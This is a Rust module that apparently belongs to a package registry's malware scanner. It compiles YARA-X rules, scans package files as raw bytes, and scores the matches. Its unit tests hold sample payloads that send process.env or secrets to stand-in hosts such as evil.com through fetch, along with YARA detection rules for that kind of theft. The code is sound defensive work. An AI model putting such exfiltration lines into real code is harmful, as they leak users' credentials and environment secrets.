//! YARA-X–based pattern scanning for supply-chain malware detection.
//!
//! Compiles `.yar` / `.yara` rule bundles once into an immutable `Arc<yara_x::Rules>`
//! swapped atomically via [`arc_swap::ArcSwapOption`] (`VNA-12`), eliminating global
//! scanner mutex contention and per-scan disk I/O while preserving deterministic
//! raw-byte matching (`VNA-09`) with strict per-file timeouts.

use arc_swap::ArcSwapOption;
use sha2::{Digest, Sha256};
use std::cmp::Reverse;
use std::path::PathBuf;
use std::sync::{Arc, Mutex, OnceLock};
use std::time::Duration;
use tracing::{debug, info, warn};

/// Default per-file YARA scan timeout (`ADR-018 INV-09` / Layer 2).
pub const DEFAULT_YARA_SCAN_TIMEOUT: Duration = Duration::from_secs(5);

/// A single YARA match found during scanning.
#[derive(Debug, Clone)]
pub struct YaraMatch {
    /// Rule identifier (e.g. "ExfilEnvVars").
    pub rule_name: String,
    /// Threat level from rule metadata (1–5).
    pub threat_level: u8,
    /// Human-readable description from rule metadata.
    pub description: String,
    /// Category tag (e.g. "exfiltration", "obfuscation").
    pub category: String,
    /// Which file inside the package matched.
    pub matched_file: String,
}

/// Errors returned by [`scan_raw_files`].
#[derive(Debug, Clone, thiserror::Error, PartialEq, Eq)]
pub enum YaraScanError {
    #[error("YARA rules are unavailable")]
    RulesUnavailable,
    #[error("YARA scan timed out while inspecting '{file}'")]
    Timeout { file: String },
    #[error("YARA scan failed on '{file}': {reason}")]
    ScanFailed { file: String, reason: String },
}

/// Default rules directory, relative to the working directory.
const DEFAULT_RULES_DIR: &str = "rules";

struct CompiledYaraBundle {
    dir: PathBuf,
    digest: String,
    files: usize,
    rules: Arc<yara_x::Rules>,
}

/// Lock-free hot-path reference to compiled immutable `yara_x::Rules`.
static ACTIVE_RULES: OnceLock<ArcSwapOption<CompiledYaraBundle>> = OnceLock::new();
/// Serializes cold compilation / directory reloads only; never held while scanning.
static RELOAD_MUTEX: OnceLock<Mutex<()>> = OnceLock::new();

#[derive(Debug, Clone)]
pub struct YaraRulesStatus {
    pub available: bool,
    pub digest: String,
    pub files: usize,
    pub error: Option<String>,
}

fn active_rules_slot() -> &'static ArcSwapOption<CompiledYaraBundle> {
    ACTIVE_RULES.get_or_init(ArcSwapOption::empty)
}

fn reload_mutex() -> &'static Mutex<()> {
    RELOAD_MUTEX.get_or_init(|| Mutex::new(()))
}

/// Return the rules directory path, overridable via `CREG_YARA_RULES_DIR`.
fn rules_dir() -> PathBuf {
    std::env::var("CREG_YARA_RULES_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from(DEFAULT_RULES_DIR))
}

fn yara_scan_timeout() -> Duration {
    std::env::var("CREG_YARA_SCAN_TIMEOUT_MS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .filter(|&ms| ms > 0)
        .map(Duration::from_millis)
        .unwrap_or(DEFAULT_YARA_SCAN_TIMEOUT)
}

fn rules_digest(dir: &PathBuf) -> Result<(String, usize), String> {
    let entries = std::fs::read_dir(dir)
        .map_err(|error| format!("cannot read YARA rules directory: {error}"))?;
    let mut paths = entries
        .map(|entry| {
            entry
                .map(|entry| entry.path())
                .map_err(|error| format!("cannot inspect YARA rules directory entry: {error}"))
        })
        .collect::<Result<Vec<_>, _>>()?
        .into_iter()
        .filter(|path| {
            matches!(
                path.extension().and_then(|extension| extension.to_str()),
                Some("yar" | "yara")
            )
        })
        .collect::<Vec<_>>();
    paths.sort();
    if paths.is_empty() {
        return Err("no .yar or .yara files found".to_string());
    }

    let mut hasher = Sha256::new();
    hasher.update(b"creg-yara-rule-bundle-v1\0");
    for path in &paths {
        let name = path
            .file_name()
            .and_then(|name| name.to_str())
            .ok_or_else(|| "YARA rule filename is not valid UTF-8".to_string())?;
        let source = std::fs::read(path)
            .map_err(|error| format!("cannot read YARA rule {}: {error}", path.display()))?;
        hasher.update((name.len() as u64).to_be_bytes());
        hasher.update(name.as_bytes());
        hasher.update((source.len() as u64).to_be_bytes());
        hasher.update(source);
    }
    Ok((hex::encode(hasher.finalize()), paths.len()))
}

/// Compile all `.yar` / `.yara` files from the rules directory.
fn compile_rules(dir: &PathBuf) -> Option<yara_x::Rules> {
    if !dir.is_dir() {
        warn!(
            "YARA rules directory '{}' not found — YARA scanning disabled",
            dir.display()
        );
        return None;
    }

    let mut compiler = yara_x::Compiler::new();
    let mut loaded = 0usize;

    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(err) => {
            warn!(
                "Failed to read YARA rules directory '{}': {}",
                dir.display(),
                err
            );
            return None;
        }
    };

    let mut paths = entries
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .collect::<Vec<_>>();
    paths.sort();
    let mut failed = false;
    for path in paths {
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
        if ext != "yar" && ext != "yara" {
            continue;
        }
        match std::fs::read_to_string(&path) {
            Ok(source) => {
                if let Err(e) = compiler.add_source(source.as_str()) {
                    warn!("Failed to compile YARA rule '{}': {}", path.display(), e);
                    failed = true;
                } else {
                    loaded += 1;
                }
            }
            Err(e) => {
                warn!("Failed to read YARA rule '{}': {}", path.display(), e);
                failed = true;
            }
        }
    }

    if loaded == 0 || failed {
        warn!(
            "YARA bundle is incomplete or has no rules in '{}' — YARA scanning disabled",
            dir.display()
        );
        return None;
    }

    let rules = compiler.build();
    info!(
        "Compiled {} YARA rule file(s) from '{}'",
        loaded,
        dir.display()
    );
    Some(rules)
}

fn compile_and_store_if_changed(
    dir: &PathBuf,
    expected_digest: &str,
    expected_files: usize,
) -> Option<Arc<CompiledYaraBundle>> {
    let _guard = reload_mutex().lock().unwrap_or_else(|e| e.into_inner());
    let slot = active_rules_slot();
    if let Some(current) = slot.load_full() {
        if current.dir == *dir && current.digest == expected_digest {
            return Some(current);
        }
    }

    let Some(rules) = compile_rules(dir) else {
        slot.store(None);
        return None;
    };

    let compiled = Arc::new(CompiledYaraBundle {
        dir: dir.clone(),
        digest: expected_digest.to_string(),
        files: expected_files,
        rules: Arc::new(rules),
    });
    slot.store(Some(Arc::clone(&compiled)));
    Some(compiled)
}

/// Wait-free hot-path bundle fetch: performs zero mutex acquisition and zero disk
/// I/O whenever the cached bundle already matches the active `CREG_YARA_RULES_DIR`.
fn load_active_rules() -> Option<Arc<CompiledYaraBundle>> {
    let dir = rules_dir();
    let slot = active_rules_slot();
    if let Some(bundle) = slot.load_full() {
        if bundle.dir == dir {
            return Some(bundle);
        }
    }

    let Ok((digest, files)) = rules_digest(&dir) else {
        slot.store(None);
        return None;
    };
    compile_and_store_if_changed(&dir, &digest, files)
}

/// Forces an immediate disk-digest verification and atomic `ArcSwap` reload of
/// compiled YARA rules from `CREG_YARA_RULES_DIR`.
pub fn reload_rules() -> YaraRulesStatus {
    rules_status()
}

/// Whether a non-empty YARA rule bundle was loaded successfully.
///
/// Public-testnet admission uses this as a fail-closed guard before packages
/// enter the pending pool.
pub fn rules_available() -> bool {
    rules_status().available
}

/// Return a content digest for the exact, successfully compiled YARA bundle,
/// transparently reloading `Arc<yara_x::Rules>` if on-disk rules changed.
pub fn rules_status() -> YaraRulesStatus {
    let dir = rules_dir();
    let (digest, files) = match rules_digest(&dir) {
        Ok(status) => status,
        Err(error) => {
            active_rules_slot().store(None);
            return YaraRulesStatus {
                available: false,
                digest: String::new(),
                files: 0,
                error: Some(error),
            };
        }
    };

    if let Some(bundle) = active_rules_slot().load_full() {
        if bundle.dir == dir && bundle.digest == digest {
            return YaraRulesStatus {
                available: true,
                digest,
                files: bundle.files,
                error: None,
            };
        }
    }

    let available = compile_and_store_if_changed(&dir, &digest, files).is_some();
    YaraRulesStatus {
        available,
        digest,
        files,
        error: (!available).then(|| "one or more YARA rule files failed to compile".to_string()),
    }
}

/// Scans raw byte buffers directly with a specific immutable `yara_x::Rules` set
/// and per-file timeout, without acquiring any global lock.
pub fn scan_raw_with_rules(
    rules: &yara_x::Rules,
    files: &[(&str, &[u8])],
    timeout: Duration,
) -> Result<Vec<YaraMatch>, YaraScanError> {
    let mut matches = Vec::new();
    let mut scanner = yara_x::Scanner::new(rules);
    scanner.set_timeout(timeout);

    for &(path, bytes) in files {
        match scanner.scan(bytes) {
            Ok(results) => {
                for rule in results.matching_rules() {
                    let threat_level = rule
                        .metadata()
                        .into_iter()
                        .find(|(id, _)| *id == "threat_level")
                        .and_then(|(_, val)| match val {
                            yara_x::MetaValue::Integer(v) => Some(v as u8),
                            _ => None,
                        })
                        .unwrap_or(3);

                    let description = rule
                        .metadata()
                        .into_iter()
                        .find(|(id, _)| *id == "description")
                        .and_then(|(_, val)| match val {
                            yara_x::MetaValue::String(s) => Some(s.to_string()),
                            _ => None,
                        })
                        .unwrap_or_else(|| rule.identifier().to_string());

                    let category = rule
                        .metadata()
                        .into_iter()
                        .find(|(id, _)| *id == "category")
                        .and_then(|(_, val)| match val {
                            yara_x::MetaValue::String(s) => Some(s.to_string()),
                            _ => None,
                        })
                        .unwrap_or_else(|| "unknown".to_string());

                    matches.push(YaraMatch {
                        rule_name: rule.identifier().to_string(),
                        threat_level,
                        description,
                        category,
                        matched_file: path.to_string(),
                    });
                }
            }
            Err(yara_x::errors::ScanError::Timeout) => {
                warn!("YARA scan timed out for '{}'", path);
                return Err(YaraScanError::Timeout {
                    file: path.to_string(),
                });
            }
            Err(err) => {
                debug!("YARA scan error for '{}': {}", path, err);
                return Err(YaraScanError::ScanFailed {
                    file: path.to_string(),
                    reason: err.to_string(),
                });
            }
        }
    }

    matches.sort_by(|a, b| {
        Reverse(a.threat_level)
            .cmp(&Reverse(b.threat_level))
            .then_with(|| a.rule_name.cmp(&b.rule_name))
            .then_with(|| a.matched_file.cmp(&b.matched_file))
    });
    Ok(matches)
}

/// Wait-free raw-byte YARA scan using the compiled `Arc<yara_x::Rules>` bundle.
/// Preserves arbitrary invalid UTF-8 sequences (`VNA-09`), executes without any
/// global lock (`VNA-12`), and enforces `DEFAULT_YARA_SCAN_TIMEOUT`.
pub fn scan_raw_files(files: &[(&str, &[u8])]) -> Result<Vec<YaraMatch>, YaraScanError> {
    let Some(bundle) = load_active_rules() else {
        return Err(YaraScanError::RulesUnavailable);
    };
    scan_raw_with_rules(&bundle.rules, files, yara_scan_timeout())
}

/// Backward-compatible wrapper for text `(path, content)` pairs.
pub fn scan_files(files: &[(String, String)]) -> Vec<YaraMatch> {
    let refs: Vec<(&str, &[u8])> = files
        .iter()
        .map(|(path, content)| (path.as_str(), content.as_bytes()))
        .collect();
    scan_raw_files(&refs).unwrap_or_default()
}

/// Convert YARA matches to a malicious probability score (0.0 – 1.0).
pub fn matches_to_probability(matches: &[YaraMatch]) -> f32 {
    if matches.is_empty() {
        return 0.0;
    }

    let max_threat: f32 = matches
        .iter()
        .map(|m| m.threat_level as f32)
        .fold(0.0f32, f32::max);

    // Map threat levels: 5→0.95, 4→0.80, 3→0.55, 2→0.35, 1→0.15
    let base = match max_threat as u8 {
        5 => 0.95,
        4 => 0.80,
        3 => 0.55,
        2 => 0.35,
        _ => 0.15,
    };

    // Boost slightly for multiple matches (capped at +0.05)
    let count_boost = ((matches.len() as f32 - 1.0) * 0.01).min(0.05);

    (base + count_boost).min(1.0)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn compile_inline(rule_src: &str) -> Arc<yara_x::Rules> {
        let mut compiler = yara_x::Compiler::new();
        compiler.add_source(rule_src).expect("rule should compile");
        Arc::new(compiler.build())
    }

    fn scan_with_inline_rules(rule_src: &str, files: &[(&str, &[u8])]) -> Vec<YaraMatch> {
        let rules = compile_inline(rule_src);
        scan_raw_with_rules(&rules, files, DEFAULT_YARA_SCAN_TIMEOUT).expect("inline scan")
    }

    #[test]
    fn test_yara_detects_env_exfiltration() {
        let rule = r#"
            rule ExfilEnvVars {
                meta:
                    threat_level = 5
                strings:
                    $env = "process.env" nocase
                    $send = "fetch(" nocase
                condition:
                    $env and $send
            }
        "#;
        let payload =
            b"const e = process.env; fetch('https://evil.com', {body: JSON.stringify(e)})";
        let matches = scan_with_inline_rules(rule, &[("index.js", payload.as_slice())]);
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].rule_name, "ExfilEnvVars");
        assert_eq!(matches[0].threat_level, 5);
    }

    #[test]
    fn test_yara_detects_raw_bytes_containing_invalid_utf8_0xff() {
        let rule = r#"
            rule ExfilEnvVars {
                meta:
                    threat_level = 5
                strings:
                    $env = "process.env" nocase
                    $send = "fetch(" nocase
                condition:
                    $env and $send
            }
        "#;
        let mut payload = b"// \xff\xfe binary comment header\n".to_vec();
        payload.extend_from_slice(b"fetch('https://evil.example', {body: process.env.SECRET});");
        assert!(std::str::from_utf8(&payload).is_err());

        let matches = scan_with_inline_rules(rule, &[("index.js", payload.as_slice())]);
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].rule_name, "ExfilEnvVars");
    }

    #[test]
    fn test_concurrent_arc_yara_scans_zero_contention() {
        let rule = r#"
            rule MultiThreadProbe {
                meta:
                    threat_level = 5
                strings:
                    $a = "process.env"
                    $b = "eval("
                condition:
                    $a and $b
            }
        "#;
        let rules = compile_inline(rule);
        let handles: Vec<_> = (0..16)
            .map(|tid| {
                let shared = Arc::clone(&rules);
                std::thread::spawn(move || {
                    for iter in 0..40 {
                        let res = scan_raw_with_rules(
                            &shared,
                            &[(
                                "index.js",
                                format!("// {tid}-{iter}\neval(process.env.TOKEN)").as_bytes(),
                            )],
                            DEFAULT_YARA_SCAN_TIMEOUT,
                        )
                        .expect("concurrent scan must succeed");
                        assert_eq!(res.len(), 1);
                        assert_eq!(res[0].rule_name, "MultiThreadProbe");
                    }
                })
            })
            .collect();
        for handle in handles {
            handle.join().expect("thread join");
        }
    }

    #[test]
    fn test_yara_clean_file_no_match() {
        let rule = r#"
            rule ExfilEnvVars {
                meta:
                    threat_level = 5
                strings:
                    $env = "process.env" nocase
                    $send = "fetch(" nocase
                condition:
                    $env and $send
            }
        "#;
        let matches = scan_with_inline_rules(rule, &[("index.js", b"console.log('hello world');")]);
        assert!(matches.is_empty());
    }

    #[test]
    fn test_yara_multiple_files_multiple_rules() {
        let rule = r#"
            rule RuleA {
                meta:
                    threat_level = 4
                strings:
                    $a = "MALICIOUS_A"
                condition:
                    $a
            }
            rule RuleB {
                meta:
                    threat_level = 2
                strings:
                    $b = "MALICIOUS_B"
                condition:
                    $b
            }
        "#;
        let files = [
            ("a.js", b"MALICIOUS_A is here".as_slice()),
            ("b.py", b"MALICIOUS_B pattern found".as_slice()),
        ];
        let matches = scan_with_inline_rules(rule, &files);
        assert_eq!(matches.len(), 2);
    }

    #[test]
    fn test_matches_to_probability_empty() {
        assert_eq!(matches_to_probability(&[]), 0.0);
    }

    #[test]
    fn test_matches_to_probability_high_threat() {
        let matches = vec![YaraMatch {
            rule_name: "test".into(),
            threat_level: 5,
            description: String::new(),
            category: String::new(),
            matched_file: "f.js".into(),
        }];
        let prob = matches_to_probability(&matches);
        assert!((prob - 0.95).abs() < 0.01);
    }

    #[test]
    fn test_matches_to_probability_multi_boost() {
        let matches = vec![
            YaraMatch {
                rule_name: "a".into(),
                threat_level: 4,
                description: String::new(),
                category: String::new(),
                matched_file: "a.js".into(),
            },
            YaraMatch {
                rule_name: "b".into(),
                threat_level: 3,
                description: String::new(),
                category: String::new(),
                matched_file: "b.js".into(),
            },
        ];
        let prob = matches_to_probability(&matches);
        assert!((prob - 0.81).abs() < 0.01);
    }

    #[test]
    fn test_scan_files_empty_input() {
        let _lock = crate::env_test_lock();
        let files: Vec<(String, String)> = vec![];
        let matches = scan_files(&files);
        assert!(matches.is_empty());
    }
}
